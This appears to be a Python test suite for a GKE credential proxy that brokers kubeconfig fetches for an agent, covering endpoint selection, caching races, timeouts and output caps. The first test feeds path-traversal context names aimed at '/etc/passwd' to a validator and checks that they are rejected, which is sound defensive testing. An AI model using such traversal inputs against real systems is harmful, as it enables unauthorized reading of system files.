            "gke_demo-project_us-central1_../../etc/passwd",
            f"{self.CONTEXT}/../../etc/passwd",
            f"{self.CONTEXT}:/etc/kubeconfig.yaml",
        ):
            with self.subTest(context=hostile):
                with self.assertRaisesRegex(ValueError, "not a GKE context name"):
                    executor._resolve_kubeconfig(hostile)

    # ---- Fetching, and the returned pin --------------------------------------

    def test_cache_miss_refetches_credentials_from_gcloud(self):
        executor = self.fake_gcloud(self.executor())

        resolved = executor._resolve_kubeconfig(self.CONTEXT)

        self.assertEqual(executor.kubeconfig_dir / f"{self.CONTEXT}.yaml", resolved)
        self.assertIn(self.CONTEXT, resolved.read_text(encoding="utf-8"))
        # Nothing is left behind from the fetch.
        self.assertEqual([resolved.name], sorted(p.name for p in executor.kubeconfig_dir.iterdir()))

    def test_get_credentials_returns_the_document_and_caches_it(self):
        # cluster_agent_profile.py and switch_kube_context both reach a cluster
        # by running this first, so it is what warms the cache. The caller also
        # needs the file itself — the profile records a path and the Cluster
        # Agent preflight stats it — and it comes back in the response, because
        # the proxy cannot write into a volume it does not mount.
        executor = self.fake_gcloud(self.executor())

        result = executor.execute(
            ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
             "--location=us-central1", "--project=demo-project"],
            wants_kubeconfig=True,
        )

        self.assertEqual(0, result.exit_code)
        self.assertIn(self.CONTEXT, result.kubeconfig)
        managed = executor.kubeconfig_dir / f"{self.CONTEXT}.yaml"
        self.assertIn(self.CONTEXT, managed.read_text(encoding="utf-8"))

    def test_get_credentials_returns_nothing_when_the_caller_did_not_ask(self):
        # Only the shim knows whether a file is wanted, and a request that did
        # not ask for one must not carry the document back across the boundary.
        executor = self.fake_gcloud(self.executor())

        result = executor.execute(
            ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
             "--location=us-central1", "--project=demo-project"],
        )

        self.assertEqual(0, result.exit_code)
        self.assertEqual("", result.kubeconfig)

    def test_get_credentials_never_writes_into_the_shared_workspace(self):
        # gcloud must not be handed a path the agent can reach; if it were, the
        # agent could swap the file between the write and the read that files it
        # in the cache.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            # Only the fetch itself: the endpoint decision in front of it runs
            # a help probe and a describe through the same seam, with no
            # kubeconfig at all.
            if "get-credentials" in argv and "--help" not in argv:
                seen.append(kwargs.get("kubeconfig_path"))
            return original(argv, **kwargs)

        with mock.patch.object(executor, "_execute", record):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
                wants_kubeconfig=True,
            )

        self.assertEqual(1, len(seen))
        self.assertFalse(executor._within_workspace(seen[0]))

    def test_get_credentials_uses_scratch_even_when_no_kubeconfig_is_wanted(self):
        # This path used to skip the scratch file and let gcloud write whatever
        # `KUBECONFIG` named -- the broker's own base config. Asserted on the
        # base file rather than on the routing: that write is what must not
        # happen.
        executor = self.fake_gcloud(self.executor())
        base = Path(executor.environment["KUBECONFIG"])
        base.parent.mkdir(parents=True, exist_ok=True)
        before = f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n"
        base.write_text(before, encoding="utf-8")
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            # Only the fetch itself: the endpoint decision in front of it runs
            # a help probe and a describe through the same seam, with no
            # kubeconfig at all.
            if "get-credentials" in argv and "--help" not in argv:
                seen.append(kwargs.get("kubeconfig_path"))
            return original(argv, **kwargs)

        with mock.patch.object(executor, "_execute", record):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-b",
                 "--location=us-central1", "--project=demo-project"],
            )

        self.assertEqual(1, len(seen))
        self.assertIsNotNone(seen[0])
        self.assertNotEqual(base, seen[0])
        self.assertEqual(before, base.read_text(encoding="utf-8"))

    # ---- Choosing the control-plane endpoint --------------------------------

    @staticmethod
    def age_marker(executor, target):
        """Push a provisional marker past its retry window."""
        marker = executor._provisional_marker(target)
        old = time.time() - credential_proxy.PROVISIONAL_RETRY_SECONDS - 1
        os.utime(marker, (old, old))

    @staticmethod
    def a_decision(flags, provisional=False):
        """An EndpointDecision carrying `flags`, for patching gke_endpoint."""
        import gke_endpoint

        kind = {"--dns-endpoint": gke_endpoint.KIND_DNS, "--internal-ip": gke_endpoint.KIND_INTERNAL_IP}.get(
            flags[0] if flags else "", gke_endpoint.KIND_IP)
        return gke_endpoint.EndpointDecision(tuple(flags), kind, "203.0.113.10", None, None, "",
                                             provisional=provisional)

    def test_cache_miss_passes_dns_endpoint_when_the_cluster_needs_it(self):
        # The cold path: a restart empties the state dir, so the proxy refetches
        # on its own rather than reusing what the agent's get-credentials filed.
        # A DNS-only cluster has to survive that refetch.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--dns-endpoint"])),
            mock.patch.object(executor, "_execute", record),
        ):
            executor._resolve_kubeconfig(self.CONTEXT)

        fetches = [argv for argv in seen if "get-credentials" in argv]
        self.assertEqual(1, len(fetches))
        self.assertEqual("--dns-endpoint", fetches[0][-1])

    def test_a_callers_unflagged_fetch_gets_the_brokers_endpoint_decision(self):
        # The broker files whatever a caller's get-credentials produced as the
        # shared kubeconfig for that cluster. A by-hand or skill-driven fetch
        # that names no endpoint would otherwise move an internal-ip cluster
        # back to its public IP for every brokered kubectl after it.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])) as decide,
            mock.patch.object(executor, "_execute", record),
        ):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-b",
                 "--location=us-central1", "--project=demo-project"],
            )

        fetches = [argv for argv in seen if "get-credentials" in argv]
        self.assertEqual(1, len(fetches))
        self.assertEqual("--internal-ip", fetches[0][-1])
        decide.assert_called_once()
        self.assertEqual(("demo-project", "cluster-b", "us-central1"), decide.call_args.args)

    def test_a_callers_fetch_target_is_read_through_gclouds_flag_shapes(self):
        # Every spelling a hand-typed command might carry: a global flag with a
        # detached value ahead of the cluster name, `-z`, and --project before
        # the verb. None may be read as the cluster name or lose the target.
        cases = [
            (["gcloud", "--verbosity", "debug", "container", "clusters", "get-credentials",
              "cluster-b", "--location=us-central1", "--project=demo-project"],
             ("demo-project", "cluster-b", "us-central1")),
            (["gcloud", "container", "clusters", "get-credentials", "cluster-b",
              "-z", "us-central1-a", "--project", "demo-project"],
             ("demo-project", "cluster-b", "us-central1-a")),
            (["gcloud", "--project=demo-project", "container", "clusters", "get-credentials",
              "cluster-b", "--region", "us-central1"],
             ("demo-project", "cluster-b", "us-central1")),
            # A detached value after the verb and ahead of the cluster: only the
            # arity skip keeps `demo-project` from being read as the cluster.
            (["gcloud", "container", "clusters", "get-credentials", "--project", "demo-project",
              "cluster-b", "--location", "us-central1"],
             ("demo-project", "cluster-b", "us-central1")),
        ]
        for argv, expected in cases:
            with self.subTest(argv=argv):
                target = credential_proxy._get_credentials_target(argv)
                self.assertIsNotNone(target, argv)
                self.assertEqual(expected, (target.project, target.cluster, target.location))

    def test_a_callers_fetch_without_a_project_uses_the_brokers_own(self):
        # The hand-typed form omits --project; the bootstrap set gcloud's
        # default project to GKE_PROJECT_ID, so that is what gcloud will use.
        with mock.patch.dict(os.environ, {"GKE_PROJECT_ID": "demo-project"}):
            target = credential_proxy._get_credentials_target(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-b", "--location=us-central1"])
        self.assertIsNotNone(target)
        self.assertEqual(("demo-project", "cluster-b", "us-central1"),
                         (target.project, target.cluster, target.location))
        with mock.patch.dict(os.environ, {"GKE_PROJECT_ID": ""}):
            self.assertIsNone(credential_proxy._get_credentials_target(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-b", "--location=us-central1"]))

    def test_a_callers_fetch_that_names_an_endpoint_is_run_as_given(self):
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])) as decide,
            mock.patch.object(executor, "_execute", record),
        ):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-b",
                 "--zone", "us-central1-a", "--project=demo-project", "--dns-endpoint"],
            )

        fetches = [argv for argv in seen if "get-credentials" in argv]
        self.assertEqual(1, len(fetches))
        self.assertNotIn("--internal-ip", fetches[0])
        self.assertEqual("--dns-endpoint", fetches[0][-1])
        decide.assert_not_called()

    def test_a_callers_fetch_without_a_full_target_is_run_as_given(self):
        # Without project and location there is nothing to describe; gcloud
        # falls back to its configured defaults and the broker does not guess.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])) as decide,
            mock.patch.object(executor, "_execute", record),
        ):
            executor.execute(["gcloud", "container", "clusters", "get-credentials", "cluster-b"])

        fetches = [argv for argv in seen if "get-credentials" in argv]
        self.assertEqual(1, len(fetches))
        self.assertNotIn("--internal-ip", fetches[0])
        decide.assert_not_called()

    def test_a_kubeconfig_fetched_on_a_provisional_decision_is_refetched_next_time(self):
        # The decision fell back because the broker's own-cluster describe
        # failed. The file it produced serves the request in flight, and the
        # next request fetches again rather than reusing it until a restart.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with (
            mock.patch("gke_endpoint.endpoint_decision",
                       return_value=self.a_decision([], provisional=True)),
            mock.patch.object(executor, "_execute", record),
        ):
            first = executor._resolve_kubeconfig(self.CONTEXT)
            second = executor._resolve_kubeconfig(self.CONTEXT)
        self.age_marker(executor, target)
        with (
            mock.patch("gke_endpoint.endpoint_decision",
                       return_value=self.a_decision(["--internal-ip"])),
            mock.patch.object(executor, "_execute", record),
        ):
            third = executor._resolve_kubeconfig(self.CONTEXT)
            fourth = executor._resolve_kubeconfig(self.CONTEXT)

        fetches = [argv for argv in seen if "get-credentials" in argv and "--help" not in argv]
        self.assertEqual(2, len(fetches), "one provisional fetch served inside its window, one settled, then the cache")
        self.assertEqual("--internal-ip", fetches[1][-1])
        self.assertTrue(first.is_file() and second.is_file() and third.is_file() and fourth.is_file())
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_a_callers_fetch_on_a_provisional_decision_is_refetched_by_the_next_read(self):
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)),
            mock.patch.object(executor, "_execute", record),
        ):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
            )
        self.age_marker(executor, credential_proxy.parse_gke_context(self.CONTEXT))
        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])),
            mock.patch.object(executor, "_execute", record),
        ):
            executor._resolve_kubeconfig(self.CONTEXT)

        fetches = [argv for argv in seen if "get-credentials" in argv and "--help" not in argv]
        self.assertEqual(2, len(fetches), "the caller's provisional file was not reused past its window")
        self.assertEqual("--internal-ip", fetches[1][-1])

    def test_a_fresh_provisional_file_is_served_and_an_old_one_is_a_miss(self):
        # Bounds the cost of an own-cluster describe that keeps failing: the
        # provisional file is reused inside its retry window and refetched after.
        executor = self.fake_gcloud(self.executor())
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(argv)
            return original(argv, **kwargs)

        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)),
            mock.patch.object(executor, "_execute", record),
        ):
            executor._resolve_kubeconfig(self.CONTEXT)
            executor._resolve_kubeconfig(self.CONTEXT)
            self.assertTrue(executor._provisional_marker(target).exists())
            self.age_marker(executor, target)
            executor._resolve_kubeconfig(self.CONTEXT)

        fetches = [argv for argv in seen if "get-credentials" in argv and "--help" not in argv]
        self.assertEqual(2, len(fetches), "one fetch, one reuse inside the window, one refetch after it")

    def test_a_settled_callers_fetch_clears_an_older_marker(self):
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)):
            executor._resolve_kubeconfig(self.CONTEXT)
        self.assertTrue(executor._provisional_marker(target).exists())
        with mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
            )
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_a_callers_fetch_with_its_own_flag_clears_an_older_marker(self):
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)):
            executor._resolve_kubeconfig(self.CONTEXT)
        self.assertTrue(executor._provisional_marker(target).exists())
        with mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)) as decide:
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project", "--dns-endpoint"],
            )
        decide.assert_not_called()
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_a_help_probe_that_did_not_answer_leaves_the_fetch_provisional(self):
        # The mirror of the failed-describe case through the real
        # endpoint_decision: a support probe that exits non-zero on this one
        # call is undecided, not "no flag", so the file is marked and refetched.
        import gke_endpoint

        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        gke_endpoint.reset_cache()
        self.addCleanup(gke_endpoint.reset_cache)
        original_execute = executor._execute

        def failing_help(argv, **kwargs):
            result = original_execute(argv, **kwargs)
            if "--help" in argv:
                return replace(result, exit_code=1, stdout="")
            return result

        with mock.patch.object(executor, "_execute", failing_help):
            executor._resolve_kubeconfig(self.CONTEXT)
        self.assertTrue(executor._provisional_marker(target).exists())
        self.assertIsNone(gke_endpoint._support_cache)

    def test_a_fetch_with_no_decision_at_all_is_provisional_too(self):
        # The target describe failed with nothing cached: gcloud's default is
        # as unsettled as a fallback made without the own cluster.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with mock.patch("gke_endpoint.endpoint_decision", return_value=None):
            executor._resolve_kubeconfig(self.CONTEXT)
        self.assertTrue(executor._provisional_marker(target).exists())

    def test_a_callers_fetch_with_no_decision_at_all_is_provisional_too(self):
        # The broker read the target and tried to decide, and the describe
        # failed: the caller's result is as unsettled as the broker's own
        # would be, and must not clear an older mark either.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with mock.patch("gke_endpoint.endpoint_decision", return_value=None):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
            )
        self.assertTrue(executor._provisional_marker(target).exists())

    def test_a_failed_refetch_past_the_window_serves_the_file_it_has(self):
        # The mark is set when the GKE API was just failing, so the refetch
        # runs into the same condition. A working kubeconfig on disk beats a
        # 400, and the window is pushed out so the next request waits again.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        with mock.patch("gke_endpoint.endpoint_decision", return_value=None):
            first = executor._resolve_kubeconfig(self.CONTEXT)
        self.age_marker(executor, target)
        original = executor._execute

        def failing_fetch(argv, **kwargs):
            result = original(argv, **kwargs)
            if "get-credentials" in argv and "--help" not in argv:
                return replace(result, exit_code=1, stderr="ERROR: (gcloud.container.clusters.get-credentials) 503")
            return result

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=None),
            mock.patch.object(executor, "_execute", failing_fetch),
        ):
            second = executor._resolve_kubeconfig(self.CONTEXT)
        self.assertEqual(first, second)
        self.assertTrue(second.is_file())
        marker = executor._provisional_marker(target)
        self.assertTrue(marker.exists())
        self.assertTrue(executor._provisional_window_open(marker), "the window was pushed out")

    def test_a_failed_broker_fetch_does_not_mark_a_settled_file_a_caller_filed_meanwhile(self):
        # A caller's fetch files outside _kubeconfig_lock, so between the
        # broker's miss and its failed fetch a settled file can land. Serving it
        # is right; marking it provisional would send it back to the fetch
        # path a minute later and let an undecided refetch overwrite it.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        managed = executor._managed_kubeconfig(target)
        original = executor._execute

        def caller_lands_then_fetch_fails(argv, **kwargs):
            result = original(argv, **kwargs)
            if "get-credentials" in argv and "--help" not in argv:
                managed.parent.mkdir(parents=True, exist_ok=True)
                managed.write_text(f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n")
                return replace(result, exit_code=1, stderr="ERROR: 503")
            return result

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision(["--internal-ip"])),
            mock.patch.object(executor, "_execute", caller_lands_then_fetch_fails),
        ):
            served = executor._resolve_kubeconfig(self.CONTEXT)
        self.assertEqual(managed, served)
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_a_provisional_broker_fetch_does_not_replace_a_settled_file_a_caller_filed_meanwhile(self):
        # The succeeding half of the same race: the broker's decision was
        # undecided, its fetch succeeded, and a caller's settled file landed
        # in between. An unmarked file present at filing time can only mean a
        # settled answer arrived since the decision was made; it wins.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        managed = executor._managed_kubeconfig(target)
        settled = f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n# settled by a caller\n"
        original = executor._execute

        def caller_lands_then_fetch_succeeds(argv, **kwargs):
            result = original(argv, **kwargs)
            if "get-credentials" in argv and "--help" not in argv:
                managed.parent.mkdir(parents=True, exist_ok=True)
                managed.write_text(settled)
            return result

        with (
            mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([], provisional=True)),
            mock.patch.object(executor, "_execute", caller_lands_then_fetch_succeeds),
        ):
            served = executor._resolve_kubeconfig(self.CONTEXT)
        self.assertEqual(managed, served)
        self.assertEqual(settled, managed.read_text(), "the caller's settled file was kept")
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_a_callers_undecided_fetch_refreshes_a_settled_file_already_on_disk(self):
        # An unmarked file is the steady state of every cluster filed settled,
        # not a race signature. A re-run of the onboarding whose broker-side
        # decision happens to be undecided must still replace the stale file
        # (under a mark), or the remedy the tree prescribes does nothing.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        managed = executor._managed_kubeconfig(target)
        managed.parent.mkdir(parents=True, exist_ok=True)
        stale = f"apiVersion: v1\nkind: Config\ncurrent-context: {self.CONTEXT}\n# stale, filed long ago\n"
        managed.write_text(stale)
        old = time.time() - 3600
        os.utime(managed, (old, old))
        with mock.patch("gke_endpoint.endpoint_decision", return_value=None):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
            )
        self.assertNotEqual(stale, managed.read_text(), "gcloud's fresh kubeconfig replaced the stale one")
        self.assertTrue(executor._provisional_marker(target).exists(), "and it is marked for re-decision")

    def test_the_splice_decides_under_a_tighter_bound_than_a_kubectl(self):
        # The describes behind a caller's splice run inside the caller's own
        # fetch bound (30 s for switch_kube_context), so each is bounded well
        # under a kubectl's 60 s rather than at it.
        executor = self.fake_gcloud(self.executor())
        bounds = []
        original = executor._execute

        def record(argv, **kwargs):
            if "describe" in argv or "--help" in argv:
                bounds.append(kwargs.get("timeout_seconds"))
            return original(argv, **kwargs)

        import gke_endpoint
        gke_endpoint.reset_cache()
        self.addCleanup(gke_endpoint.reset_cache)
        with mock.patch.object(executor, "_execute", record):
            executor.execute(
                ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                 "--location=us-central1", "--project=demo-project"],
            )
        self.assertTrue(bounds, "the splice ran a probe or a describe")
        for bound in bounds:
            self.assertEqual(credential_proxy.SPLICE_DECISION_TIMEOUT_SECONDS, bound)
        self.assertLess(credential_proxy.SPLICE_DECISION_TIMEOUT_SECONDS, executor.kubectl_timeout_seconds)

    def test_a_callers_fetch_files_its_result_without_the_kubeconfig_lock(self):
        # The broker's cold read holds _kubeconfig_lock across its gcloud runs.
        # A scaffold's fetch must not queue behind it to file a credential it
        # already has; only the marker step is serialised, on its own lock.
        executor = self.fake_gcloud(self.executor())
        executor._kubeconfig_lock.acquire()
        try:
            done = threading.Event()

            def run():
                with mock.patch("gke_endpoint.endpoint_decision", return_value=self.a_decision([])):
                    executor.execute(
                        ["gcloud", "container", "clusters", "get-credentials", "cluster-a",
                         "--location=us-central1", "--project=demo-project"],
                    )
                done.set()

            threading.Thread(target=run, daemon=True).start()
            self.assertTrue(done.wait(timeout=10), "the caller's fetch waited on the kubeconfig lock")
        finally:
            executor._kubeconfig_lock.release()

    def test_dns_endpoint_probe_runs_the_resolved_gcloud_not_whatever_is_on_path(self):
        # gke_endpoint builds argv starting with the literal "gcloud". In the
        # sidecar the only gcloud that may run is the resolved executable, so the
        # adapter has to substitute it.
        executor = self.fake_gcloud(self.executor())
        resolved = executor.executables["gcloud"]
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        seen = []

        def fake_decision(project, cluster, location, *, run=None, env=None):
            seen.append(run(["gcloud", "container", "clusters", "describe", cluster]))
            return None

        with mock.patch("gke_endpoint.endpoint_decision", fake_decision):
            executor._endpoint_decision(resolved, target)

        self.assertEqual(1, len(seen))
        # The stub answers a describe with "{}" and exits 0; what this proves is
        # that the adapter ran *something*, and ran it through _execute.
        self.assertIsInstance(seen[0], tuple)

    def test_missing_gke_endpoint_falls_back_instead_of_failing_the_fetch(self):
        # credential_proxy is otherwise stdlib-only. Losing a sibling module must
        # cost the flag, not the whole credential proxy -- and it is a settled
        # loss: the module will not appear while the pod runs, so the file it
        # fetches is not provisional, or every cluster would refetch each minute.
        executor = self.fake_gcloud(self.executor())
        target = credential_proxy.parse_gke_context(self.CONTEXT)

        with mock.patch.dict(sys.modules, {"gke_endpoint": None}):
            self.assertIsNone(executor._endpoint_decision("gcloud", target))
            executor._resolve_kubeconfig(self.CONTEXT)
        self.assertFalse(executor._provisional_marker(target).exists())

    def test_timeout_kills_command(self):
        result = self.executor(timeout_seconds=1).execute_internal(["/bin/sleep", "10"])
        self.assertTrue(result.timed_out)
        self.assertEqual(124, result.exit_code)

    def test_timeout_handles_process_group_exit_race(self):
        # The group can be gone by the time the deadline fires -- the command
        # exits between the timeout and the kill -- and a kill that finds
        # nothing must not turn a timeout into an exception. The sleep here
        # outlives the deadline by a fifth of a second and ends on its own;
        # every signal to its group is made to answer as though it had already.
        with mock.patch("credential_proxy.os.killpg", side_effect=ProcessLookupError):
            result = self.executor(timeout_seconds=1).execute_internal(["/bin/sleep", "1.2"])
        self.assertTrue(result.timed_out)
        self.assertEqual(124, result.exit_code)

    # ---- What a command's output costs this process --------------------------
    #
    # Output is read as it streams and only `max_output_bytes` of each stream is
    # kept. Before this, `communicate()` held every byte a command printed until
    # it exited, so the broker's memory tracked the size of what commands
    # printed times how many ran at once -- the OOM loop in #2018.

    def test_output_past_the_cap_is_dropped_as_it_streams(self):
        # 3 MiB printed, 4 KiB kept: the command still runs to completion (a
        # child blocked on a full pipe would time out instead) and the caller
        # gets exactly the cap, marked truncated.
        executor = self.fake_kubectl(
            self.executor(max_output_bytes=4096),
            body="head -c 3145728 /dev/zero | tr '\\0' a",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertEqual(0, result.exit_code)
        self.assertFalse(result.timed_out)
        self.assertTrue(result.truncated)
        self.assertEqual(4096, len(result.stdout))
        self.assertEqual("a" * 4096, result.stdout)

    def test_each_stream_is_capped_on_its_own(self):
        executor = self.fake_kubectl(
            self.executor(max_output_bytes=4096),
            body="printf ok; head -c 100000 /dev/zero | tr '\\0' e >&2",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertEqual("ok", result.stdout)
        self.assertEqual("e" * 4096, result.stderr)
        self.assertTrue(result.truncated)

    def test_output_within_the_cap_is_complete_and_not_marked_truncated(self):
        executor = self.fake_kubectl(
            self.executor(max_output_bytes=1 << 20),
            body="head -c 200000 /dev/zero | tr '\\0' b; printf err >&2; exit 3",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertEqual(3, result.exit_code)
        self.assertFalse(result.truncated)
        self.assertEqual(200000, len(result.stdout))
        self.assertEqual("err", result.stderr)

    def test_output_that_is_not_utf8_is_bounded_once_decoded(self):
        # Every byte that is not UTF-8 decodes to a three-byte replacement
        # character, so a stream of them at the cap would leave the process,
        # and then the response, three times the cap. The bound is on the
        # decoded text's UTF-8 size, not only on the bytes captured.
        executor = self.fake_kubectl(
            self.executor(max_output_bytes=64 << 10),
            body="head -c 200000 /dev/zero | tr '\\0' '\\377'",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.truncated)
        self.assertLessEqual(len(result.stdout.encode("utf-8")), 64 << 10)
        self.assertEqual({"�"}, set(result.stdout))

    def test_valid_utf8_output_is_returned_as_written(self):
        executor = self.fake_kubectl(self.executor(), body="printf 'h\\303\\251llo'")

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertFalse(result.truncated)
        self.assertEqual("héllo", result.stdout)

    def test_a_large_stdin_is_delivered_in_full(self):
        # Larger than a pipe buffer, so the write has to interleave with the
        # reads: a command that echoes its input back would otherwise deadlock
        # against a writer that waits for it to be read.
        executor = self.fake_kubectl(self.executor(max_output_bytes=1 << 24), body="cat")
        payload = "x" * (1 << 20)

        result = executor.execute(["kubectl", "get", "pods"], stdin=payload)

        self.assertEqual(0, result.exit_code)
        self.assertEqual(payload, result.stdout)

    def test_stdin_is_fed_after_the_outputs_close(self):
        # A child that closes stdout and stderr first and then reads its input
        # is still owed the input: the read loop has to keep going for stdin
        # alone, or the child blocks on a half-written pipe until the deadline.
        # `wc` reads all of stdin and reports the count into a file, since its
        # stdout is gone.
        count_file = Path(self.temp_dir.name) / "count"
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=2),
            body=f'exec >&- 2>&-; wc -c > "{count_file}"',
        )
        payload = "y" * (1 << 20)

        result = executor.execute(["kubectl", "get", "pods"], stdin=payload)

        self.assertFalse(result.timed_out)
        self.assertEqual(0, result.exit_code)
        self.assertEqual(str(len(payload)), count_file.read_text().strip())

    def test_a_timed_out_command_still_returns_what_it_wrote(self):
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="printf partial; sleep 10",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertEqual(124, result.exit_code)
        self.assertEqual("partial", result.stdout)
        self.assertIn("kubectl command timed out after 1s", result.stderr)

    def test_output_past_the_cap_never_lands_in_this_process(self):
        # The claim the streaming read exists for, checked against the process
        # rather than against the result: 16 MiB printed against a 64 KiB cap
        # must not cost 16 MiB here. Reading the whole output first and
        # truncating afterwards passes every other test in this group and
        # fails this one.
        import tracemalloc

        printed = 16 << 20
        executor = self.fake_kubectl(
            self.executor(max_output_bytes=64 << 10),
            body=f"head -c {printed} /dev/zero | tr '\\0' a",
        )
        tracemalloc.start()
        try:
            tracemalloc.reset_peak()
            result = executor.execute(["kubectl", "get", "pods"])
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()

        self.assertTrue(result.truncated)
        self.assertLess(
            peak, printed // 4, f"{peak} bytes peaked in this process for {printed} printed"
        )

    def test_an_ended_command_gets_sigterm_before_sigkill(self):
        # git removes its lock files on SIGTERM and cannot on SIGKILL, so the
        # end a command gets -- at its deadline or when its caller leaves -- is
        # TERM, a grace period, then KILL. The stub proves the order by writing
        # a marker from its TERM handler.
        marker = Path(self.temp_dir.name) / "terminated"
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body=f"trap 'touch \"{marker}\"; exit 143' TERM; sleep 10 & wait $!",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertTrue(
            marker.exists(), "the command was not given SIGTERM before it was killed"
        )

    def test_a_command_that_ignores_sigterm_is_killed_after_the_grace(self):
        # `trap '' TERM` is inherited by the sleep, so nothing in the group
        # exits on the first signal; the second one is what ends it, after the
        # grace and well before the sleep would have.
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="trap '' TERM; sleep 10 & wait $!",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        grace_ms = credential_proxy.KILL_GRACE_SECONDS * 1000
        self.assertGreaterEqual(result.duration_ms, 1000 + grace_ms - 100)
        # The ceiling says the second signal ended the command, not the sleep
        # running out, so it needs seconds of slack rather than a fraction of
        # one: the span includes forking the stub, which a loaded runner can
        # take half a second over, and under a PID 1 that does not reap (the
        # test process itself as PID 1 of a container, say) the killed sleep
        # stays a zombie in the group and the wait after SIGKILL runs its
        # whole bound. How quickly that wait returns once the group is gone
        # is not a matter of wall-clock here; the fake-clock test below pins
        # it.
        self.assertLess(result.duration_ms, 9000)

